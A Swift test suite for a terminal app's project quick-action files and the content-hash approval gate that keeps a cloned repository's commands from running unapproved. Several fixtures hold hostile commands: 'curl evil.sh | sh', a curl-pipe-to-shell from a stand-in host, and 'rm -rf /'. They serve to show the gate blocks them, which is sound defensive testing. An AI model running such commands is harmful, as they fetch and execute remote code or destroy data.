import Testing
@testable import NyxCore

private let projectFile = """
# Buttons for this project.
quick = Test | make test
quick = Up | toggle | docker compose up
font-size = 96
theme = something-else
"""

// MARK: - Parsing a project file

@Test func aProjectFileContributesItsQuickActions() {
    let project = ProjectActionsFile.parse(projectFile)
    #expect(project.actions.count == 2)
    #expect(project.actions[0].name == "Test")
    #expect(project.actions[1].kind == .toggle)
}

/// A project may add buttons. It may not reach into settings -- a repository that could set your
/// font, your theme or your key bindings by being cloned is a repository that can surprise you.
@Test func aProjectFileCannotChangeSettings() {
    let project = ProjectActionsFile.parse(projectFile)
    #expect(project.actions.allSatisfy { $0.name != "font-size" && $0.name != "theme" })
    // Nothing but `quick` is read at all, so there is no path from this file to a Config value.
    #expect(project.actions.count == 2)
}

@Test func anEmptyOrCommentOnlyFileContributesNothing() {
    #expect(ProjectActionsFile.parse("").actions.isEmpty)
    #expect(ProjectActionsFile.parse("# nothing here\n\n").actions.isEmpty)
}

// MARK: - Approval

@Test func nothingIsApprovedUntilItIsApproved() {
    let project = ProjectActionsFile.parse(projectFile)
    let approvals = ProjectApprovals()
    #expect(!approvals.isApproved(directory: "/repo", digest: project.digest))
    #expect(!approvals.wasApprovedForDifferentContent(directory: "/repo", digest: project.digest))
}

@Test func approvingADirectoryLetsItsActionsThrough() {
    let project = ProjectActionsFile.parse(projectFile)
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/repo", digest: project.digest)
    #expect(approvals.isApproved(directory: "/repo", digest: project.digest))
}

/// The whole point of hashing the contents: a `git pull` that changes the file must not inherit
/// the approval given to what the user actually read.
@Test func editingTheFileRevokesTheApproval() {
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/repo", digest: ProjectActionsFile.parse(projectFile).digest)

    let changed = ProjectActionsFile.parse(projectFile + "\nquick = Sneaky | curl evil.sh | sh")
    #expect(!approvals.isApproved(directory: "/repo", digest: changed.digest))
    // ...and the caller can tell "this changed" apart from "never seen before", which are
    // different things to say to someone.
    #expect(approvals.wasApprovedForDifferentContent(directory: "/repo", digest: changed.digest))
}

@Test func approvingOneDirectoryDoesNotApproveAnother() {
    let project = ProjectActionsFile.parse(projectFile)
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/repo", digest: project.digest)
    #expect(!approvals.isApproved(directory: "/other", digest: project.digest))
}

@Test func revokingTakesItBack() {
    let project = ProjectActionsFile.parse(projectFile)
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/repo", digest: project.digest)
    approvals.revoke(directory: "/repo")
    #expect(!approvals.isApproved(directory: "/repo", digest: project.digest))
}

/// `cd` reports a path with or without its trailing slash depending on how it was typed, and being
/// asked to approve the same project twice would look broken.
@Test func aTrailingSlashIsTheSameDirectory() {
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/repo/", digest: "abc")
    #expect(approvals.isApproved(directory: "/repo", digest: "abc"))
    #expect(approvals.isApproved(directory: "/repo/", digest: "abc"))
}

@Test func theRootDirectoryKeepsItsSlash() {
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/", digest: "abc")
    #expect(approvals.isApproved(directory: "/", digest: "abc"))
}

// MARK: - Round trip

@Test func approvalsSurviveBeingWrittenAndReadBack() {
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/Users/nik/projects/nyx", digest: "deadbeef")
    approvals.approve(directory: "/Users/nik/My Projects/with spaces", digest: "cafe")

    let restored = ProjectApprovals.parse(approvals.serialised())
    #expect(restored == approvals)
    #expect(restored.isApproved(directory: "/Users/nik/My Projects/with spaces", digest: "cafe"))
}

@Test func aHandEditedApprovalsFileIsReadLeniently() {
    let restored = ProjectApprovals.parse("""
    # a comment

    deadbeef /Users/nik/projects/nyx
    garbage-with-no-directory
    """)
    #expect(restored.isApproved(directory: "/Users/nik/projects/nyx", digest: "deadbeef"))
    #expect(restored.directories.count == 1)
}

// MARK: - The gate
//
// The security boundary, stated as tests. Nothing from a `.nyx` file may run, become a button or
// reach the palette before the user has been shown the commands and approved that directory --
// cloning a repository must not be enough.

private let hostile = """
quick = Test | make test
quick = Deploy | run | curl https://example.invalid/x.sh | sh
"""

private func gate(_ contents: String?, approvals: ProjectApprovals = ProjectApprovals(),
                  directory: String = "/w/proj") -> ProjectActionsState {
    ProjectActionsGate.state(directory: directory, fileContents: contents, approvals: approvals)
}

@Test func aDirectoryWithNoProjectFileOffersNothing() {
    #expect(gate(nil) == .none)
    #expect(gate(nil).runnableActions.isEmpty)
}

/// The one that matters: a fresh clone. The file is there, it parses, and not one of its commands
/// is allowed anywhere near a button.
@Test func aNeverSeenProjectRunsNothing() {
    let state = gate(hostile)
    #expect(state.needsApproval)
    #expect(state.runnableActions.isEmpty)
    // ...but the user can be shown them, which is the whole point of asking.
    #expect(state.actionsToShow.count == 2)
}

@Test func anApprovedProjectContributesItsActions() {
    let digest = ProjectActionsFile.digest(of: hostile)
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/w/proj", digest: digest)
    let state = gate(hostile, approvals: approvals)
    #expect(!state.needsApproval)
    #expect(state.runnableActions.count == 2)
}

/// Approval is recorded against the contents, so an edit -- or a `git pull` that brings one in --
/// revokes it. Everything stops running until the user looks again.
@Test func anEditedProjectFileRevokesTheApproval() {
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/w/proj", digest: ProjectActionsFile.digest(of: hostile))
    let state = gate(hostile + "\nquick = Extra | rm -rf /", approvals: approvals)
    #expect(state.runnableActions.isEmpty)
    if case .changed = state {} else { Issue.record("expected .changed, got \(state)") }
}

/// Approving one directory approves that directory, not the idea of project files.
@Test func anApprovalDoesNotTravelToAnotherDirectory() {
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/w/proj", digest: ProjectActionsFile.digest(of: hostile))
    #expect(gate(hostile, approvals: approvals, directory: "/w/other").runnableActions.isEmpty)
}

/// A trailing slash is the same directory; being asked again for `/a/b/` after approving `/a/b`
/// would look broken. The normalisation is `ProjectApprovals`'; this says the gate inherits it.
@Test func theGateInheritsTheTrailingSlashRule() {
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/w/proj", digest: ProjectActionsFile.digest(of: hostile))
    #expect(gate(hostile, approvals: approvals, directory: "/w/proj/").runnableActions.count == 2)
}

/// A file that defines nothing gets no bar: approving a list of nothing grants nothing, and an
/// empty `.nyx` must not be a way to put a strip in front of somebody.
@Test func aProjectFileWithNoActionsIsInvisible() {
    #expect(gate("# nothing here\nfont-size = 96") == .none)
    #expect(gate("") == .none)
}

/// A project may add buttons and may not change a setting -- the parser already refuses, and this
/// says so from the gate's side, where it is the thing being relied on.
@Test func aProjectCannotSetSettingsEvenOnceApproved() {
    let text = "quick = Test | make test\ntheme = evil\nfont-size = 96"
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/w/proj", digest: ProjectActionsFile.digest(of: text))
    let state = gate(text, approvals: approvals)
    #expect(state.runnableActions.count == 1)
    #expect(state.runnableActions[0].name == "Test")
}

// MARK: - What the user is told

@Test func theBarNamesTheProjectAndHowManyActions() {
    let message = ProjectActionsGate.barMessage(for: gate(hostile), directory: "/w/proj")
    #expect(message?.contains("proj") == true)
    #expect(message?.contains("2") == true)
}

/// "These changed" is a different question from "this wants to add actions", and the user has
/// already answered the second one.
@Test func aChangedProjectSaysSoRatherThanAskingAfresh() {
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/w/proj", digest: "stale")
    let message = ProjectActionsGate.barMessage(for: gate(hostile, approvals: approvals),
                                                directory: "/w/proj")
    #expect(message?.contains("changed") == true)
}

@Test func anApprovedProjectHasNothingToSay() {
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/w/proj", digest: ProjectActionsFile.digest(of: hostile))
    #expect(ProjectActionsGate.barMessage(for: gate(hostile, approvals: approvals),
                                          directory: "/w/proj") == nil)
    #expect(ProjectActionsGate.barMessage(for: .none, directory: "/w/proj") == nil)
}

/// The review shows the commands, not the names: a button called "Test" that runs `curl … | sh` is
/// exactly what approval exists to stop, and the same file chooses both.
@Test func theReviewShowsTheCommandsThemselves() {
    let text = ProjectActionsGate.reviewText(gate(hostile).actionsToShow)
    #expect(text.contains("make test"))
    #expect(text.contains("curl https://example.invalid/x.sh | sh"))
    #expect(text.contains("run"))
}

@Test func theProjectIsNamedByItsDirectory() {
    #expect(ProjectActionsGate.displayName(of: "/Users/nik/projects/nyx") == "nyx")
    #expect(ProjectActionsGate.displayName(of: "/Users/nik/projects/nyx/") == "nyx")
    #expect(ProjectActionsGate.displayName(of: "/") == "/")
}

// MARK: - Where the record lives

/// Beside the config file, so `$NYX_CONFIG` moves both together: pointing Nyx at another config
/// directory is setting up another Nyx, which would not expect to inherit these.
@Test func approvalsLiveBesideTheConfigFile() {
    let config = ConfigPath.resolve(environment: [:], home: "/Users/nik")
    #expect(ProjectApprovals.path(besideConfigAt: config).path
        == "/Users/nik/.config/nyx/approved-projects")
}

@Test func approvalsFollowAnOverriddenConfigPath() {
    let config = ConfigPath.resolve(environment: ["NYX_CONFIG": "/tmp/alt/config"], home: "/Users/nik")
    #expect(ProjectApprovals.path(besideConfigAt: config).path == "/tmp/alt/approved-projects")
}


